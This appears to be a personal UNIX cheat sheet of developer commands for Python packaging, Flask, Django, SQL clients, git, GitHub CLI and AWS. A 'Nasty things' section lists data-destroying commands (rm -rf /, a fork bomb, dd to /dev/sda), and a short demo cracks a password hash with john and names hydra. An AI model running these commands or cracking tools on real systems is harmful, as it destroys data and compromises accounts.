-*- eval: (visual-line-mode 0) -*- #
# .always_forget.txt
#
# awdeorio's UNIX cheat sheet
#
# Andrew DeOrio <awdeorio@umich.edu>

# Users and Groups
adduser USER                            # add USER (Debian)
localhost > ssh -vnNTL 8888:localhost:8888 $REMOTEHOST
localhost > open http://localhost:8888

# Jupyter Notebook cell magic
%load_ext autoreload                    # Automatically reload source code now
%autoreload 2                           # ^^^ every time before executing code


####################
# PyPI howto
#
# https://packaging.python.org/tutorials/packaging-projects/
#
# This example is for mailmerge https://github.com/awdeorio/mailmerge

# Clean up
git fetch
git switch develop
git rebase
git clean -xdf
git status

# Test
tox

# Edit setup.py and change the version
$EDITOR setup.py
git commit -m "version bump" setup.py
git push origin develop

# Merge develop to main
git switch main
git rebase
git merge --no-ff origin/develop

# Build distribution binary and source tarball locally
python3 -m venv .venv
source .venv/bin/activate
pip3 install --upgrade pip setuptools wheel
python3 setup.py sdist bdist_wheel
ls dist/

# Tag a release and double check that the versions match
git tag -a X.Y.Z
grep version= setup.py
git describe
git push --tags origin main

# Deploy to Test PyPI and browse to https://test.pypi.org/project/mailmerge/
twine upload --sign --repository-url https://test.pypi.org/legacy/ dist/*

# Test install.  It will install, but not run because we didn't install deps.
python3 -m venv envtmp
source envtmp/bin/activate
pip install --index-url https://test.pypi.org/simple/ --no-deps mailmerge
mailmerge --version  # Expect module not found error
deactivate

# Deploy to PyPI and browse to https://pypi.org/project/mailmerge/
twine upload --sign dist/*

# Test deploy
pip3 install --upgrade mailmerge
mailmerge --version

# Draft a new release on GitHub
https://github.com/awdeorio/mailmerge/tags


########################################
# Python / Flask

# Flask command line utility
pip install flask                       # Install
export FLASK_ENV=development            # Debug mode
export FLASK_APP=insta485               # Configure application name
flask routes                            # Show the routes for the app
flask shell                             # Run a shell in the app context
flask run                               # Run a development server
flask run --host 0.0.0.0 --port 8000    # ^^^ specify host and port

# Run a development server
export FLASK_ENV=development
export FLASK_APP=insta485
flask shell


########################################
# Python / Django
# Ref: https://docs.djangoproject.com/en/1.11/intro/tutorial01/
pip install django                      # install
brew install django-completion          # bash completion for django (OSX)
python -m django --version              # check version
django-admin startproject MYSITE        # create site, including manage.py
./manage.py runserver                   # development server
./manage.py runserver 8080              # development server, alternate port
./manage.py runserver 0:8000            # development server, externally visible
./manage.py startapp MYAPP              # create app (project has multiple apps)
./manage.py migrate                     # DB migration.  Creates db tables.
./manage.py makemigrations MYAPP        # create DB migration scripts
./manage.py makemigrations -n NAME      # ^^^ with a name
cat MYAPP/migrations/0001_initial.py    # check out migration script
./manage.py sqlmigrate polls 0001       # check out SQL migrate would run
./manage.py check                       # migration dry run
./manage.py migrate                     # perform migration w/ any new scripts
./manage.py shell                       # python shell with Django environment
./manage.py createsuperuser             # create admin user for (w/ web login)
./manage.py loaddata FILE               # Load database from JSON FILE
./manage.py dumpdata                    # Dump database to JSON
./manage.py dumpdata APP                # ^^^ for single APP
./manage.py dumpdata APP.MODEL          # ^^^ for single model

# Django debugging
>>> pdb.Pdb(skip=['django.*']).set_trace()  # Do not step into django code

# Django REST Framework Debug URL Routing
# http://www.django-rest-framework.org/api-guide/routers/#defaultrouter
./manage.py shell
from django.urls import reverse
reverse("api:connectortask-detail", args=[1])


########################################
# JavaScript / Node

# Python + JS Virtual Environments
python3 -m venv env                     # create virtual environment
source env/bin/activate                 # activate virtual environment
pip install PACKAGE                     # install Python packages
pip install nodeenv                     # install node virtual env utility
nodeenv --python-virtualenv             # install local node and npm
npm install --global webpack            # install global JS packages
ls env/lib/node_modules/                # location of global JS packages
npm install .                           # install local JS package
npx PACKAGE                             # run PACKAGE command line tool
webpack                                 # build front end
webpack --watch                         # continuously build front end
webpack --display-error-details         # debug frontend build
npm install -g uglify-js                # install uglifyjs
uglifyjs --beautify FILE.js             # pretty print JavaScript

# npm
npm install --save-prod PACKAGE         # Install and add to package.json (prod)
npm install --save-dev PACKAGE          # Install and add to package.json (dev)
npm update PACKAGE --save               # Upgrade one package
npm list PACKAGE                        # Check if PACKAGE is installed

# Update all dependencies in package.json
npm install --global npm-check-updates
npm-check-updates --upgrade
npm-check-updates --upgradeAll
npm install .

# node
NODE_DEBUG='*' node test.js             # Enable all debug messages
NODE_DEBUG=timer node test.js           # Enable only timer debug messages
node --trace-events-enabled --trace-event-categories node.async_hooks --trace-event-file-pattern log.json test.js  # VERY detailed debug info

# fetch() in node
npm install node-fetch                  # Install node-fetch
const fetch = require("node-fetch");    # Import node-fetch in your program

# Lint
npx eslint --env-info
npx eslint PATH
npx prettier --support-info
npx prettier --check PATH  # Check
npx prettier --write PATH  # Fix


########################################
# GoLang

$ export GOPATH=${HOME}/.go             # Set Go library install root
$ export PATH=${PATH}:${GOPATH}/bin     # Add Go utilities to PATH
$ go env GOPATH                         # Get Go library install root
$ go env                                # List all Go environment variables
$ go get -v .                           # Install dependencies
$ go test -v                            # Run all unit tests
$ go test -run TESTNAME                 # Run one unit test
$ go get golang.org/x/tools/cmd/...     # Install godoc et al.
$ go get -v -u golang.org/x/lint/golint # Install golint
$ go get -u github.com/nsf/gocode       # Install gocode
$ go get -v github.com/rogpeppe/godef   # Install godef
$ go get -u github.com/derekparker/delve/cmd/dlv  # Install dlv
$ godoc -http=:6060                     # Render package docs
$ open http://localhost:6060/pkg/github.com/USERNAME/PACKGE/  # See package docs

########################################
# Ruby

$GEM_HOME                               # Ruby library install root
gem env                                 # sanity check gem paths
gem install PACKAGE                     # Install PACKAGE
gem update --system                     # Upgrade installed packages
gem cleanup                             # Remove old versions
gem list                                # List installed packages
gem outdated                            # List installed and outdated packages


########################################
# SQL

# sqlite3 Linux CLI
sqlite3 file.db                         # open connection to database from file
sqlite3> .databases                     # list the databases
sqlite3> .tables                        # list the tables
sqlite3> .schema                        # show the table creation commands
sqlite3> .headers on                    # print table column names
sqlite3> .mode column                   # pretty print table columns
sqlite3> .show                          # print settings
sqlite3> PRAGMA foreign_keys;           # check if foreign keys enabled
sqlite3> PRAGMA foreign_keys = ON;      # enable foreign keys (CASCADE, etc)

# sqlite3 dump to CSV (2 ways)
sqlite3 -header -csv FILE.db < query.sql > dump.csv
sqlite3 FILE.db
sqlite3> .headers on
sqlite3> .mode csv
sqlite3> .output dump.csv
sqlite3> SELECT * FROM table;

# sqlite3 load from CSV
echo -ne '.mode csv\n.import FILE.csv DB_NAME\n' | sqlite3 FILE.db
sqlite3 FILE.db
sqlite3> .mode csv
sqlite3> .import FILE.csv

# MySQL Linux CLI
mysql.server start                      # start SQL server
mysqladmin -u root password PASSWORD    # change root password
mysql -u root                           # connect, no password
mysql -u root -pPASSWORD                # connect, w/password, NO SPACE
mysql -u root -p                        # connect, prompt password
mysql -u user -p DB                     # connect and open DB
mysql -u user -p < SCRIPT               # run script
mysqldump -u user -pPASSWD DB > file.db # dump database to file
mysql -u [user] db < FILE.sql           # restore db from file
mysql -e 'SHOW DATABASES'               # run SQL at the CLI
mysqldump --add-drop-table \            # copy DB from localhost to HOST
  --extended-insert --force \
  --log-error=error.log -uUSER -pPASS \
  OLD_DB_NAME | ssh -C HOST \
  "mysql -uUSER -pPASS NEW_DB_NAME"
mysql> source monday.sql                # run script
mysql> SELECT * FROM table \            # dump to CSV
       INTO OUTFILE '/Users/awdeorio/out.csv' \
       FIELDS TERMINATED BY ',' \
       LINES TERMINATED BY '\n'
mysql> CREATE DATABASE mydb;            # Create db
mysql> USE mydb;                        # Set default db

mysql> USE db                           # Default database for future commands
mysql> SHOW DATABASES                   # List databases
mysql> SHOW TABLES                      # List tables

# PostgreSQL Linux CLI
# https://www.postgresql.org/docs/current/static/app-psql.html
psql                                    # Start postgresql shell
psql -c QUERY                           # Execute QUERY
psql -f FILE.sql -v ON_ERROR_STOP=1     # Read commands from FILE.sql
psql -a [--echo-all]                    # Echo all input commands and queries
psql -U DB_USER -h DB_HOST -d DB_NAME   # connect using a TCP connection
sudo -u postgres psql                   # Start shell, Ubuntu
PGPASSWORD=${DB_PASSWORD} psql          # Specify password at CLI
psql -d DB                              # Specify database at CLI
psql -U USERNAME                        # Specify username at CLI
psql -h HOST                            # Specify host at CLI
createdb DB                             # Create database
psql> CREATE DATABASE db;               # Create database
dropdb --echo DB                        # Drop a database, verbose
psql -c 'SELECT usename FROM pg_user;'  # List users
createuser USER                         # Create user
createuser USER --createdb              # Create user with create DB permissions
createuser USER --superuser             # Create superuser
psql -c "ALTER ROLE user WITH PASSWORD 'password'"  # Change password
dropuser --echo USER                    # Remove a user, verbose
pg_dump DB -f FILE.sql                  # Dump database to file
pg_dump -t TABLE DB > FILE.sql          # Dump one table to file
psql -lqt                               # list databases
psql> \list                             # list databases
psql> \l                                # list databases
psql> \connect DB                       # connect to database
psql> \c URL                            # connect to database using URL
psql> \dt                               # list tables
psql> \d+ TABLE                         # display schema
psql> \du                               # list users
psql> \quit                             # exit psql CLI
psql> \q                                # exit psql CLI

# Postgres check if DB exists
SELECT 1 FROM pg_database WHERE datname='DB'
$ psql postgres -tAc "SELECT 1 AS result FROM pg_database WHERE datname='DB'"

# Postgres check if USER exists (do this on the 'postgres' DB)
psql> SELECT 1 FROM pg_roles WHERE rolname='USER'
$ psql postgres -tAc "SELECT 1 FROM pg_roles WHERE rolname='USER'"

# Postgres dump table to CSV, compressed and uncompressed
psql <<< "COPY table TO 'file.csv' DELIMITER ',' CSV HEADER;"
psql <<< "COPY table TO STDOUT DELIMITER ',' CSV HEADER;" | gzip -f >FILE.csv.gz
psql -c "COPY (<select query>) TO STDOUT WITH CSV"
sudo -H sudo -u postgres psql DB <<< "COPY () TO STDOUT DELIMITER ',' CSV HEADER;"

# Microsoft SQL Server (2005, 2008, 2012, 2014)
SELECT @@VERSION                        # Microsoft Server SQL version
SELECT TOP 10 * FROM table;             # return 10 results

# Show databases
SELECT name FROM master.dbo.sysdatabases # databases

# Show tables
SELECT * FROM information_schema.tables WHERE TABLE_TYPE='BASE TABLE' # tables

# Show tables from <DATABASE_NAME>
SELECT TABLE_NAME FROM <DATABASE_NAME>.INFORMATION_SCHEMA.Tables WHERE TABLE_TYPE = 'BASE TABLE'

# Show tables from <SCHEMA_NAME>
FIXME

SELECT * FROM <schema>.[<table>]        # handle table names with spaces

# MSSQL column names
SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'myTable'

# Oracle SQL
SELECT * FROM table WHERE ROWNUM <= 10  # return 10 results

# Oracle SQL version
SELECT * FROM v$version

# Print column names
SELECT COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='<name>'

# Auto increment
PRIMARY KEY AUTO_INCREMENT              # MySQL
SERIAL PRIMARY KEY                      # PostgreSQL https://www.tutorialspoint.com/postgresql/postgresql_using_autoincrement.htm 
INTEGER PRIMARY KEY                     # SQLite, reuse rowids https://sqlite.org/autoinc.html
INTEGER PRIMARY KEY AUTOINCREMENT       # SQLite3, monotonically increasing

# SQL
TIMESTAMP DEFAULT CURRENT_TIMESTAMP     # avoid initializing timestamps
FOREIGN KEY (child_id)                  # add foreign key constraint to col
  REFERENCES parent_table(parent_id)    # connect to column in parent table
  ON UPDATE CASCADE                     # update child rows with parents row
  ON DELETE CASCADE                     # delete child rows with parents row
SELECT a.*, b.*                         # 2-way join AKA inner join
  FROM a JOIN b
  ON a.id=b.id;
SELECT a.*, b.*, c.*                    # 3-way join AKA inner join
  FROM (a JOIN b ON a.id=b.id)
  JOIN c ON (b.id=c.id);
SELECT                                  # Join same table twice
  students.email AS student,
  staff.email AS staff,
  FROM queue
  JOIN users AS students ON queue.student_id=students.id
  JOIN users AS staff ON queue.staff_id=staff.id
SELECT MAX(id) FROM table               # last auto-generated id from table
SELECT LAST_INSERT_ID()                 # last auto-generated id, globally
SELECT * FROM table ORDER BY x ASC;     # sort on x, ascending
SELECT * FROM table ORDER BY x DESC;    # sort on x, descending
SELECT * FROM table LIMIT 1;            # return one result
SELECT * FROM table ORDER BY x ASC LIMIT 1  # FIRST
SELECT * FROM table ORDER BY x DESC LIMIT 1 # LAST
CREATE DATABASE db;                     # create new database db
SHOW DATABASES;                         # list all databases
DROP DATABASE db;                       # delete database
SHOW CREATE TABLE table;                # print statement to create table
USE db;                                 # open database db
SHOW TABLES;                            # list tables in db
DROP TABLE table;                       # delete table
DROP TABLE table IF EXISTS table;       # delete table if it exists
INSERT INTO table (col, ...)            # add a row
  VALUES ('val', ...);                  # ...
UPDATE table SET col=val WHERE cond;    # update a row
DELETE FROM table WHERE column="value"; # remove one row
DELETE FROM table;                      # remove all rows in table
GROUP BY
PARTITION
RANK

# SQL Common Table Expressions
# Basically "named sub queries"
# https://blog.expensify.com/2015/09/25/the-simplest-sqlite-common-table-expression-tutorial/
WITH x AS (SELECT * FROM y)
SELECT * from y

# ODBC  https://github.com/mkleehammer/pyodbc/wiki
odbcinst -j                             # Show location of ini files
cat /etc/obdbcinst.ini                  # Driver .so locations
cat /etc/obdbc.ini                      # DSN description (shortcut, optional)
isql DB USERNAME PASSWORD               # unixODBC command line tool
iusql                                   # ^^^ with UTF8 support
isql -b <<< QUERY                       # Batch mode
isql -b -c -d, <<< QUERY                # Dump CSV


########################################
# git
#
# Lots of good examples https://github.com/k88hudson/git-flight-rules

# One-time setup for a user
git config --global user.name "Name"    # Your name for author when committing
git config --global user.email "email"  # email address (global)
git config user.email "email"           # email address for one project
git config --global color.diff auto     # colors: git diff
git config --global color.status auto   # colors: git status
git config --global color.branch auto   # colors: git branch
git config --global commit.gpgSign true # Sign commits by default
git config --global user.signingKey BB6201BA07530070  # which key to sign with

# One-time setup for a project
git clone ssh://USERNAME@SERVER/~/opt/git/PROJECT.git # server
git clone git@github.com:REPO/PROJECT.git             # github
git clone https://github.com/REPO/PROJECT.git         # github anonymous
git init DIR                                          # no server

# Linux line endings: .gitattributes
* text=auto eol=lf

# Push an existing repository to a remote
git remote add origin git@github.com:ORGANIZATION/PROJECT.git
git push -u origin master

# Basic workflow
git pull                                # update local copy
$EDITOR FILE                            # work on stuff, modify files
git add FILE                            # add file to commit
git status                              # see what's been added or modified
git commit                              # commit any added files
git push                                # push changes to server

# Repository setup on a server (without github)
ssh SERVER                              # alternative: use shared network volume
mkdir -p ~/opt/git/PROJECT.git          # make directory
git init --bare ~/opt/git/PROJECT.git   # intialize bare repository

# Repository setup on github
https://github.com -> "make a new repository"   # Create a new repository
https://help.github.com/articles/generating-ssh-keys/ # SSH keys
https://help.github.com/articles/remove-sensitive-data/ # remove sensitive data

# Update your local copy, merging from repository, manual
git fetch origin                        # fetch from origin
git fetch --prune                       # remove stale local branches
git fetch -vp                           # ^^^ + verbose
git branch                              # check your branch
git diff master origin/master           # see changes
git merge origin/master                 # this will be a FF if no local changes
git rebase origin/master                # 

# Forking work flow: Edit a branch on a fork using a remote named after USER
git remote add USER git@github.com:USER/REPO.git
git fetch USER
git switch BRANCH
git switch -c BRANCH-USER --track USER/BRANCH  # If branch has same name
git commit
git push
git push USER HEAD:BRANCH                      # If branch has same name
git remote remove USER                         # Clean up

# Forking work flow: Edit a branch on a fork using the gh tool
gh pr checkout NUM
git commit
git push git@github.com:USER/REPO.git

# Forking work flow: Edit a branch using a clone
# https://help.github.com/articles/committing-changes-to-a-pull-request-branch-created-from-a-fork/
git clone git@github.com:seshrs/mailmerge.git mailmerge-seshrs  # Clone seshrs's fork
git remote add upstream git@github.com:awdeorio/mailmerge.git
git fetch upstream
git switch BRANCH                       # Check out PR source branch
git merge upstream/develop              # Update BRANCH
git push                                # Push to seshrs's repo

# Merging a fork
git remote add USER git@github.com:USER/REPO.git # Add additional remote
git fetch OTHER_REPO                    # Get their changes
git switch develop                      # Checkout branch you want to merge into
git merge --no-ff OTHER_REPO/OTHER_BRANCH  # Merge their changes

# Commit
git branch                              # check your branch
git status                              # check file modifications
git add FILE                            # add file to commit
git commit                              # commit, with a message
git push                                # push the commit(s) to server

# Undo
git checkout FILE                       # revert FILE to last checked-in version
git restore FILE                        # revert FILE to last checked-in version
git reset PATH                          # undo git add
git reset --soft                        # changes to tracked files are discarded
git reset --soft HEAD~                  # discard one commit not pushed
git reset --hard origin/BRANCH          # discard all commits not pushed
git reset --hard                        # reset head to COM, files unchanged
git rm -r --cached PATH                 # undo git add, without removing files
git clean -fdx --dry-run                # restore to "clean repo", DELETES
git commit --amend                      # Combine this commit with previous
git rev-list -n 1 HEAD -- FILE          # 1. Commit of a deleted file
git checkout COMMIT^ -- FILE            # 2. Recover deleted file
git revert COMMIT                       # revert COMMIT
git checkout -f COMMIT -- .             # revert *to* COMMIT

# Sanity checks
git status                              # Current branch and dirty files
git config --global --list              # Name, email, etc.
git remote -v                           # Upstream config
git branch -vv                          # Branch to upstream config
git ls-files                            # Files under version control
git clean -xdn                          # Files not under version control
head .gitignore                         # .gigitignore exists
git fetch -vv                           # Connect to upstream server

# Temporarily stash work, restoring a clean set of files
git stash                               # stash current modifications on stack
git stash list                          # view stash stack
git stash pop                           # "unstash" top of stack

# Commit only part of a file
# https://stackoverflow.com/questions/1085162/commit-only-part-of-a-file-in-git
git add --patch FILE                    # stage part of a file for commit
git add -N                              # if file isn't in repo, do this first
git diff --staged                       # check that you staged correct changes
git reset -p                            # unstage mistakenly added hunks
git commit -v                           # view commit while you edit commit msg

# Ignore some files (don't version them)
echo '*~' > .gitignore                  # ignore emacs backup files
git add .gitignore                      # git should track ignore file itself
git commit                              # git should track ignore file itself
git config --global core.excludesfile ~/.gitignore_global  # global gitigore

# History
git rev-parse HEAD                      # print hash of current commit
git log                                 # commit history
git log FILE                            # commit history for one file
git log --stat                          # show insertions and deletions
git log --oneline                       # less info
git log --oneline --decorate --graph --all # more info
git log --graph --abbrev-commit --decorate --date=relative --format=format:'%C(bold blue)%h%C(reset) - %C(bold green)(%ar)%C(reset) %C(white)%s%C(reset) %C(bold blue)- %an%C(reset)%C(bold yellow)%d%C(reset)' --all
git reflog -10                          # See last 10 actions

# Identifying commits
git rev-parse --abbrev-ref HEAD         # Current branch
git describe --dirty                    # Repo is clean or dirty
git describe --match=NeVeRmAtCh --always --abbrev=8 --dirty # COMMIT[-dirty]
git log -1 --format='%H'                # Commit hash of current branch
git rev-parse HEAD                      # Commit hash of current branch
git rev-parse master                    # Commit hash of master
git rev-parse origin/master             # Commit hash of repo's master
git diff-index --quiet HEAD --          # Return non-zero if repo is dirty

# Versions of a file
git show REV:FILE                       # Old version of file
git show HEAD^ FILE                     # last committed version
git show HEAD~4:FILE                    # 4th last commit

# Remote repositories
git remote                              # list names of remote repositories
git remote show origin                  # more info
git remote set-url origin NEW_URL       # change location of repo
git branch -vv                          # branch remotes

# Branching
git branch                              # view current and local branches
git branch -a                           # view all branches
git branch --all -vv --sort=-committerdate # view branches by recent commit date
git branch -vv                          # include tracking and commit info
git branch --merged                     # show merged branches
git branch BRANCH                       # create a new branch
git switch BRANCH                       # switch to local BRANCH
git checkout --track origin/BRANCH      # switch to remote BRANCH
git switch --track origin/BRANCH        # switch to remote BRANCH
git checkout -b BRANCH                  # create a new branch and switch to it
git switch -c BRANCH                    # create a new branch and switch to it
git push origin BRANCH                  # push BRANCH to remote
git branch --set-upstream-to=origin/BRANCH BRANCH # fix tracking
git rev-parse --abbrev-ref HEAD         # name of current branch (scriptable)

# Rename a branch
git branch -m old_branch new_branch         # Rename branch locally
git push origin -d old_branch               # Delete the old branch
git push --set-upstream origin new_branch   # Push the new branch

# Rename master -> main
# https://github.com/github/renaming
git branch -m master main
git fetch origin
git branch -u origin/main main
git remote set-head origin -a

# Branching Model  http://nvie.com/posts/a-successful-git-branching-model/
git checkout -b feature/F develop       # start working on a new feature "F"
git add FILE                            # add files
git commit                              # commit to branch feature/F
git fetch                               # get changes to feature/F from repo
git rebase                              # apply changes from repo
git push origin feature/F               # push branch to remote
git switch develop                      # switch to develop branch
git merge --no-ff feature/F             # merge F into develop, keep branch info
git branch -d feature/F                 # delete F branch
git push origin develop                 # push to server
git push origin ":feature/F"            # remove F branch from server

# A successful Git branching model AKA Git Flow
#
# Good for explicitly versioned software, or if you need to support multiple
# versions in the wild
#
# https://nvie.com/posts/a-successful-git-branching-model/
# https://danielkummer.github.io/git-flow-cheatsheet/
brew install git-flow-avh               # Install
git flow init                           # Initialize inside a repository
git flow feature start NAME             # Start a new feature
git flow feature finish NAME            # Finish a feature
git flow feature publish NAME           # Publish a feature
git flow feature pull origin NAME       # Get feature published by another user
git flow feature track NAME             # Track a feature on origin
git flow release start RELEASE          # Start a release
git flow release publish RELEASE        # Publish a release
git flow release track RELEASE          # Track a release
git flow release finish RELEASE         # Finish a release
git push --tags                         # Push release tags
git flow hotfix start VERSION           # Start a hotfix
git flow hotfix finish VERSION          # Finish a hotfix

# GitHub Flow
#
# Good for continuously delivered software, not rolled back, and you don't have
# to support multiple versions in the wild.  Very simple.
#
# https://docs.github.com/en/get-started/quickstart/github-flow
# https://www.atlassian.com/git/tutorials/comparing-workflows/feature-branch-workflow

# Tagging
git tag                                 # list tags
git tag TAG                             # apply lightweight tag
git tag -a TAG                          # apply annotated tag
git tag -a TAG REV                      # apply annotated tag to REV commit
git tag --delete TAG                    # delete a local tag
git push --delete origin TAG            # delete a remote tag
git push --delete origin TAG            # git push origin :tagname
git push --tags                         # make tags public
git checkout tags/TAG                   # checkout a tag as detacted HEAD
git describe                            # describe commit using most recent tag
git describe --dirty                    # append "-dirty" if repo isn't clean
git describe --always                   # use commit object as fallback

# Comparing
git diff BRANCH1 BRANCH2                # diff two local branches
git diff master remotes/origin/dataset  # diff two remote branches
git diff --name-status ref1..ref2       # see what files changed
git diff --stats                        # summary of insertions and deletions
git mergetool --tool-help               # list available diff/merge tools
git config --global diff.tool TOOL      # use TOOL for merging
git config --global diff.tool --directory TOOL # use TOOL for dir merging, too
https://github.com/REPO/compare/HASH1...HASH2  # Visualize diff on GitHub
gitk --all                              # GUI history and diff
git ls-files                            # List files under version control

# Merging
git merge develop                       # merge develop into current branch
git cherry-pick 62ecb3                  # merge *one* commit into current branch
git cherry-pick A^..B                   # ^^^ commits A thru B, inclusive
git checkout --theirs PATH/FILE         # conflict: keep their file
git checkout --ours PATH/FILE           # conflict: keep my file
git commit                              # conflict: I'm done, finish merge

# Signing with GPG keys
gpg -K --keyid-format LONG              # list keys
git config --global user.signingkey KEY # set key
export GPG_TTY=$(tty)                   # connect to GPG
git tag -s TAG                          # create a signed tag
git tag -v TAG                          # verify signed tag
git commit -S                           # create a signed commit
git commit --amend -S                   # sign last commit
git verify-commit HEAD                  # verify signed commit

# Rebase automatically, resulting in a linear history like Subversion
# Ref: http://stevenharman.net/git-pull-with-automatic-rebase
git config branch.autosetuprebase always
git config branch.develop.rebase true
git config branch.autosetuprebase always

# Sub modules (a subdir that is another repo)
git clone --recursive                   # Clone a repo with submodules
git submodule update --init             # Use if you forgot --recursive

# Tarballs
git archive --format tar.gz HEAD > file.tar.gz
git archive --format tar.gz --prefix PREFIX/ --output FILE.tar.gz master

# Tracking large files with git-lfs
brew install git-lfs                    # install git-lfs step 1
git lfs install                         # install git-lfs step 2
git lfs track '*.psd'                   # start tracking .psd files
git lfs track                           # types of files managed by git-lfs
git add file.psd                        # (normal git flow)
git commit -m 'blah'                    # (normal git flow)
git push origin master                  # (normal git flow)
git lfs status                          # staged (uncommitted) changes
git lfs ls-files                        # files managed by git-lfs (committed)

# Avoid checking out all commits in repo with a long history
git clone --depth N                     # Clone with truncated history
git clone --depth N --no-single-branch  # ^^^ with N commits from every branch
git fetch --depth M                     # Deepen a shallow clone
git fetch --depth M                     # Reduce size of clone (if < M), git >= 2.14

# Remove git committed passwords, large files and other nuisances
# BFG Repo Cleaner https://rtyley.github.io/bfg-repo-cleaner/

# Visual practice with git
# https://learngitbranching.js.org/
git clone
git fakeTeamwork
git commit
git fetch
git rebase
git push

# Render GitHub-flavored Markdown (GFM)
# @seshrs tips: https://preview.sesh.rs/previews/eecs485staff/primer-spec/develop-preview/docs/MARKDOWN_TIPS.html
# Lexers https://github.com/rouge-ruby/rouge/tree/master/lib/rouge/lexers
# GFM pycon: console?lang=python,prompt=>>>,...
# Other options: https://github.com/rouge-ruby/rouge/blob/6bd36244940e7ae2b4642040ca6618dfb4847993/lib/rouge/lexers/console.rb#L12-L24
pip install grip                        # install grip utility
grip -b README.md                       # render README.md in browser
grip -b --norefresh README.md           # ^^^ limit github API usage

# GitHub CLI tool (gh)
gh browse                               # open home page of current repo
gh browse 217                           # open issue or PR 217
gh browse -s                            # open settings
gh issue list                           # show issues
gh issue list --web                     # ^^^ in browser
gh pr status                            # Summary PRs code review, etc.
gh pr list                              # show PRs
gh pr list --web
gh pr view                              # show PR in terminal
gh pr view --web                        # open PR in browser
gh pr create                            # create pull request from this branch
gh pr create \                          # ^^^ prefilled
  --title "lorum" \
  --body "ipsum" \
  --reviewer HANDLE
gh pr checkout 255                      # Checkout branch for PR 255
gh pr checks                            # Show CI status for this PR
gh run watch                            # Watch jobs (steps) complete
gh run view                             # Show jobs (steps)
gh run view --log                       # Show log
gh api repos/{user}/{repo}              # Authenticated GitHub API request

# Nasty things
rm -rf /                                # Delete everything
:(){ :|: & };:                          # Fork bomb (bash)
COMMAND > /dev/sda                      # Write directly to HDD
dd if=/dev/random of=/dev/sda           # Write junk to HDD
mv ~ /dev/null                          # Move home directory to nowhere

# Password cracking demo
openssl passwd -1 -salt xyz "password" > passwd.txt
john --show passwd.txt
$ cat ~/.john/john.pot
$1$xyz$cEUv8aN9ehjhMXG/kSFnM1:password

# Password cracking over a network
hydra

# Command line fun
cowthink                               # ascii art of a fow w/ thought bubble
cowsay STRING                          # ascii art of a cow w/ speech bubble
cowsay -f tux                          # ^^^ penguin
cowsay -l                              # list characters
fortune                                # print a random adage
fortune | cowsay                       # ascii art + random adage
sl                                     # steam locomotive
asciiquarium                           # ascii art animated aquarium
telnet towel.blinkenlights.nl          # ascii animated Start Wars C-] to quit
rig                                    # generate random fake identities
rev <<< "go hang a salami im a lasagna hog" # palindrome
figlet STRING                          # print ascii bubble text
lolcat                                 # rainbow colors (gem install lolcat)
curl http://wttr.in/ann_arbor          # ascii weather report
curl wttr.in/:help                     # ascii weather report help
curl wttr.in?0                         # ascii weather report, only current
curl wttr.in?n                         # ascii weather report, narrow width
curl parrot.live                       # dancing ASCII parrot

# Emacs
apt-get install emacs-nox              # Quick install on a Debian-based server
yum install emacs-nox                  # Quick install on a Redhat-based server
emacs -Q                               # No init files at all
emacs --batch -l ~/.emacs.d/init.el    # Process init file at the CLI
emacs --batch -l ~/.emacs.d/init.el \
  --funcall auto-package-update-now    # Update all packages
emacs --batch --funcall byte-recompile-directory  # Recompile all .el files
time emacs --batch -l ~/.emacs.d/init.el  # Measure Emacs load time

# Chrome
chrome://flags/#allow-insecure-localhost  # Allow homemade certs

# AWS CLI
# brew install awscli
aws configure                           # Initialize access key and secret key
aws --output text                       # Unix pipe friendly output
aws --output json                       # JSON output
aws ec2 describe-instances              # Show EC2 instances

# AWS S3 CLI
aws s3 ls                               # List buckets
aws s3 ls BUCKET                        # List BUCKET contents
aws s3 ls BUCKET/DIR                    # List BUCKET/DIR contents
aws s3 cp FILE BUCKET                   # Copy FILE to BUCKET
aws s3 cp DIR/ s3://BUCKET/ --recursive # Copy contents of DIR to BUCKET
aws s3 rm BUCKET/FILE                   # Remove FILE
aws s3 rm BUCKET/DIR --recursive        # Remove DIR

# AWS RDS CLI
aws rds describe-db-instances           # List database instances

# AWS ECR CLI
aws ecr describe-repositories           # List repos and get ARN
aws ecr describe-images --repository-name REPO  # List images in REPO
aws ecr list-images --repository-name insta485

# AWS ECS CLI
